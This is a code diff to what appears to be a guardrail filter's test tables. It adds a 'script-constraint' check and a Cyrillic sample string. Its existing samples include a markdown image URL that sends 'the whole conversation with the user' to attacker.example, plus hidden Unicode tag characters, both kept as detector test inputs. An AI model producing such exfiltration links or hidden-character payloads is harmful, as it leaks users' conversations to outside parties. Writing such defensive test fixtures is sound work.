@@ -1761,6 +1761,7 @@ _DECISIONS_PRODUCED: dict[str, frozenset[Decision]] = {
     "injection-structural": frozenset({"allow", "redact", "deny"}),
     "pii": frozenset({"allow", "redact"}),
     "rules": frozenset({"allow", "redact", "deny"}),
+    "script-constraint": frozenset({"allow", "redact", "deny"}),
     "secrets": frozenset({"allow", "redact", "deny"}),
     "url-exfiltration": frozenset({"allow", "redact", "deny"}),
 }
@@ -1770,6 +1771,7 @@ _ON_MATCH: dict[str, tuple[Decision, ...]] = {
     "injection-structural": ("redact", "deny"),
     "pii": (),
     "rules": ("redact", "deny"),
+    "script-constraint": ("redact", "deny"),
     "secrets": ("redact", "deny"),
     "url-exfiltration": ("redact", "deny"),
 }
@@ -1784,6 +1786,7 @@ _DECISION_KEYWORD: dict[str, str] = {
     "injection-structural": "on_match",
     "pii": "on_match",
     "rules": "on_match",
+    "script-constraint": "on_match",
     "secrets": "on_match",
     "url-exfiltration": "on_detect",
 }
@@ -1798,6 +1801,10 @@ _SAMPLES = (
     "hello \U000e0041\U000e0042 world",
     "ticket JIRA-1234 on db.corp.example about project bluebird",
     "![x](https://attacker.example/p.png?d=here+is+the+whole+conversation+with+the+user)",
+    # Cyrillic, for `script-constraint` under its fixture. No other bundled
+    # check has anything to say about it, so it adds one detection path
+    # without moving any other row of the table above.
+    "\u043e\u0442\u0447\u0451\u0442 \u0433\u043e\u0442\u043e\u0432",
     "",
 )
 
